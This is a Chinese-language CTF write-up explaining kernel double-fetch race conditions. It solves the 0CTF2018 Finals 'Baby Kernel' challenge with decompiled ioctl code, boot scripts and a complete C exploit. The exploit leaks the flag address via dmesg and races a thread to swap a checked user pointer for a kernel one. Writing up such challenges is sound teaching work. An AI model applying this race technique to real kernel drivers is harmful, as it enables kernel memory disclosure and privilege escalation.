---
layout: post
title:  "Kernel double fetch"
date:   2020-3-19
desc: ""
keywords: ""
categories: [Binary]
tags: []
icon: icon-html
---

# Kernel double fetch

## 条件竞争

👴学数电的时候学过竞争-冒险现象，组合逻辑电路中，同一信号经不同的路径传输后，到达电路中某一会合点的时间有先有后，这种现象称为逻辑竞争，而因此产生输出干扰脉冲的现象称为冒险。

👴不确定这是不是条件竞争祖宗，这⑧重要

当一个软件的运行结果依赖于进程或者线程的顺序时，就可能会出现条件竞争

条件

1. 至少存在两个并发执行流
2. 多个并发流会访问同一对象
3. 至少有一个控制流会改变竞争对象的状态



## double fetch

double fetch产生于没有安全同步措施的多线程数据访问，是一种内核态与用户态之间的数据访问竞争

用户空间向内核传递数据时，内核通过通过 copy_from_user 等拷贝函数将用户数据拷贝至内核空间，在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理，此时，该数据存在被其他恶意线程篡改风险

两个用户线程，第一个准备用户数据并调用syscall，向内核传递数据。内核只引用其指针，对数据进行两次读取，第一次验证有效性，第二次真正使用。同时第二个进程利用条件竞争，在两次读取之间篡改用户数据，造成内核验证通过数据与实际使用数据不一致

double fetch引发的常见后果是数组访问越界和缓冲区溢出，从而造成内核崩溃或者提权，此外也可造成内核信息泄露等后果

## 0CTF2018 Finals Baby Kernel

这题要是和高校战役的kernel pwn一样，👴就strings出flag

```bash
strings baby.ko | grep flag
flag{THIS_WILL_BE_YOUR_FLAG_1234}
Your flag is at %px! But I don't think you know it's content
Looks like the flag is not a secret anymore. So here is it %s
flag
```

没给出bzImage，在IDA中可以看到版本4.15.0-22-generic，下载一波

start.sh

```bash
qemu-system-x86_64 \
-m 256M -smp 2,cores=2,threads=1  \
-kernel ./vmlinuz-4.15.0-22-generic \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet" \
-cpu qemu64 \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  -enable-kvm  \

```

init

```bash
#!/bin/sh
 
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
echo "flag{this_is_a_sample_flag}" > flag
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod baby.ko
chmod 777 /dev/baby
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f

```

baby_ioctl

```c
signed __int64 __fastcall baby_ioctl(__int64 a1, attr *a2)
{
  attr *v2; // rdx
  signed __int64 result; // rax
  int i; // [rsp-5Ch] [rbp-5Ch]
  attr *v5; // [rsp-58h] [rbp-58h]

  _fentry__(a1, a2);
  v5 = v2;
  if ( a2 == 0x6666 )
  {
    printk("Your flag is at %px! But I don't think you know it's content\n", flag);
    result = 0LL;
  }
  else if ( a2 == 0x1337
         && !_chk_range_not_ok(v2, 16LL, *(__readgsqword(&current_task) + 4952))
         && !_chk_range_not_ok(v5->flag_str, SLODWORD(v5->flag_len), *(__readgsqword(&current_task) + 4952))
         && LODWORD(v5->flag_len) == strlen(flag) )
  {
    for ( i = 0; i < strlen(flag); ++i )
    {
      if ( *(v5->flag_str + i) != flag[i] )
        return 0x16LL;
    }
    printk("Looks like the flag is not a secret anymore. So here is it %s\n", flag);
    result = 0LL;
  }
  else
  {
    result = 0xELL;
  }
  return result;
}
```

0x6666输出flag地址

flag结构体

```c
00000000 attr            struc ; (sizeof=0x10, mappedto_3)
00000000 flag_str        dq ?
00000008 flag_len        dq ?
00000010 attr            ends
00000010
```

0x1337三次check，数据是用户态数据，flag_str指向用户态数据，len和内核中flag len相等才能过check

过check之后如果flag和内核中的flag相同就会输出flag

利用条件竞争使传入的flag_str指针恰好在过check之后改为内核中的flag地址，就可以输出flag

创建一个进程不断的把flag_str改为内核中的flag地址

```c
#include <string.h>
char *strstr(const char *haystack, const char *needle);
#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <string.h>
char *strcasestr(const char *haystack, const char *needle);
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <pthread.h>

#define TRYTIME 0x1000
#define LEN 0x1000

struct attr
{
    char *flag;
    size_t len;
};
unsigned long long addr;
int finish =0;
char buf[LEN+1]={0};
void change_attr_value(void *s){
    struct attr * s1 = s; 
    while(finish==0){
    s1->flag = addr;
    }
}

int main(void)
{
 

    int addr_fd;
    char *idx;

    int fd = open("/dev/baby",0);
    int ret = ioctl(fd,0x6666);    
    pthread_t t1;
    struct attr t;

    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);   

    system("dmesg > /tmp/record.txt");
    addr_fd = open("/tmp/record.txt",O_RDONLY);
    lseek(addr_fd,-LEN,SEEK_END);
    read(addr_fd,buf,LEN);
    close(addr_fd);
    idx = strstr(buf,"Your flag is at ");
    if (idx == 0){
        printf("[-]Not found addr");
        exit(-1);
    }
    else{
        idx+=16;
        addr = strtoull(idx,idx+16,16);
        printf("[+]flag addr: %p\n",addr);
    }


    t.len = 33;
    t.flag = buf;
    pthread_create(&t1, NULL, change_attr_value,&t);
    for(int i=0;i<TRYTIME;i++){
        ret = ioctl(fd, 0x1337, &t);
        t.flag = buf;
    }
    
    finish = 1;
    pthread_join(t1, NULL);
    close(fd);
    puts("[+]result is :");
    system("dmesg | grep flag");
    return 0;
}

```

